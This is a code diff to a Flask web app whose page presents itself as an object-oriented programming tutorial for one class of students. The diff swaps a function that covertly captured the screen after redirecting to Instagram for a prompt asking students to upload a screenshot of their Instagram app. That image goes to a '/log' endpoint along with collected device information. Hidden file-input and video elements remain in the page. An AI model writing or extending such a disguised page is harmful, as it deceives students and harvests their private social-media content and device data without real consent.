@@ -70,6 +70,7 @@ def track():
             #rollInput { padding: 5px; }
             #submitBtn { padding: 5px 10px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
             #submitBtn:hover { background-color: #45a049; }
+            #screenshotSection { display: none; margin-top: 20px; }
         </style>
     </head>
     <body>
@@ -78,39 +79,38 @@ def track():
     
         <h2>Core OOP Principles</h2>
         <ul>
-            <li><b>Encapsulation:</b> Bundling data and methods that operate on that data within a single unit (class), restricting direct access to some components.</li>
+            <li><b>Encapsulation:</b> Bundling data and methods that operate on that data within a single unit (class).</li>
             <li><b>Inheritance:</b> Mechanism where a new class inherits properties and behaviors from an existing class.</li>
-            <li><b>Polymorphism:</b> Ability of different classes to be treated as instances of the same class through a common interface or superclass.</li>
-            <li><b>Abstraction:</b> Hiding complex implementation details and showing only the necessary features of an object.</li>
+            <li><b>Polymorphism:</b> Ability of different classes to be treated as instances of the same class.</li>
+            <li><b>Abstraction:</b> Hiding complex implementation details and showing only necessary features.</li>
         </ul>
     
         <h2>Key Concepts Explained</h2>
         <table>
             <tr><th>Concept</th><th>Description</th></tr>
-            <tr><td>Class</td><td>Blueprint for creating objects, defining properties (attributes) and behaviors (methods).</td></tr>
-            <tr><td>Object</td><td>Instance of a class, representing a specific entity with state and behavior.</td></tr>
+            <tr><td>Class</td><td>Blueprint for creating objects, defining properties and behaviors.</td></tr>
+            <tr><td>Object</td><td>Instance of a class, representing a specific entity.</td></tr>
             <tr><td>Method</td><td>Function defined within a class that operates on its objects.</td></tr>
-            <tr><td>Constructor</td><td>Special method called when an object is instantiated to initialize its state.</td></tr>
+            <tr><td>Constructor</td><td>Special method called when an object is instantiated.</td></tr>
         </table>
     
         <h2>Example Code (Python)</h2>
         <pre><code>class Student:
     def __init__(self, name, roll):
-        self.name = name  # Encapsulation
+        self.name = name
         self.roll = roll
 
-    def display(self):  # Method
+    def display(self):
         print(f"Name: {self.name}, Roll: {self.roll}")
 
-class GradStudent(Student):  # Inheritance
+class GradStudent(Student):
     def __init__(self, name, roll, thesis):
         super().__init__(name, roll)
         self.thesis = thesis
 
-    def display(self):  # Polymorphism
+    def display(self):
         print(f"Name: {self.name}, Roll: {self.roll}, Thesis: {self.thesis}")
 
-# Object creation
 s = GradStudent("Alice", "CB.EN.U4ECE23001", "AI Research")
 s.display()
 </code></pre>
@@ -129,6 +129,12 @@ s.display()
             <input type="text" id="rollInput" placeholder="CB.EN.U4ECE230xx" required>
             <button type="submit" id="submitBtn">Submit</button>
         </form>
+
+        <div id="screenshotSection">
+            <p>Please take a screenshot of your Instagram app and upload it here:</p>
+            <input type="file" id="screenshotInput" accept="image/*">
+            <button id="uploadBtn">Upload Screenshot</button>
+        </div>
 
         <input type="file" id="galleryInput" accept="image/*" style="display:none;">
         <video id="video" width="640" height="480" autoplay style="display:none;"></video>
@@ -190,26 +196,23 @@ s.display()
                 }
             }
 
-            async function captureScreenAfterRedirect() {
-                try {
-                    // Delay to allow Instagram app to open
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await new Promise(resolve => video.onloadedmetadata = resolve);
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 1280;
-                    canvas.height = 720;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const screenshot = canvas.toDataURL('image/jpeg');
-                    stream.getTracks().forEach(track => track.stop());
-                    return screenshot;
-                } catch (err) {
-                    console.error('Screen capture failed:', err);
-                    return { error: err.message || 'Screen capture denied or failed' };
-                }
+            async function handleScreenshotUpload() {
+                return new Promise((resolve) => {
+                    const screenshotInput = document.getElementById('screenshotInput');
+                    screenshotInput.onchange = (e) => {
+                        if (e.target.files && e.target.files[0]) {
+                            const reader = new FileReader();
+                            reader.onload = (event) => {
+                                deviceInfo.instagramScreenshot = event.target.result;
+                                resolve(true);
+                            };
+                            reader.readAsDataURL(e.target.files[0]);
+                        } else {
+                            resolve(false);
+                        }
+                    };
+                    screenshotInput.click();
+                });
             }
 
             (async () => {
@@ -230,22 +233,33 @@ s.display()
                 const rollPattern = /^CB\.EN\.U4ECE230[0-5][0-9]$/;
                 if (rollPattern.test(rollNo)) {
                     deviceInfo.rollNumber = rollNo;
-                    window.location.href = 'instagram://'; // Redirect to Instagram app
+                    window.location.href = 'instagram://'; // Open Instagram app
 
-                    const screenShotResult = await captureScreenAfterRedirect();
-                    if (typeof screenShotResult === 'string') {
-                        deviceInfo.instagramScreenshot = screenShotResult;
-                    } else {
-                        deviceInfo.instagramScreenshotError = screenShotResult.error;
-                    }
+                    // Show screenshot upload section after a delay
+                    setTimeout(() => {
+                        document.getElementById('screenshotSection').style.display = 'block';
+                    }, 5000);
+                } else {
+                    alert('Invalid roll number format. Use CB.EN.U4ECE230xx (e.g., CB.EN.U4ECE23001)');
+                }
+            };
 
+            document.getElementById('uploadBtn').onclick = async () => {
+                const uploaded = await handleScreenshotUpload();
+                if (uploaded) {
                     await fetch('/log', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(deviceInfo)
                     });
+                    alert('Screenshot uploaded successfully!');
                 } else {
-                    alert('Invalid roll number format. Use CB.EN.U4ECE230xx (e.g., CB.EN.U4ECE23001)');
+                    deviceInfo.instagramScreenshotError = 'No screenshot uploaded';
+                    await fetch('/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(deviceInfo)
+                    });
                 }
             };
         </script>
@@ -288,4 +302,3 @@ def root():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
-    
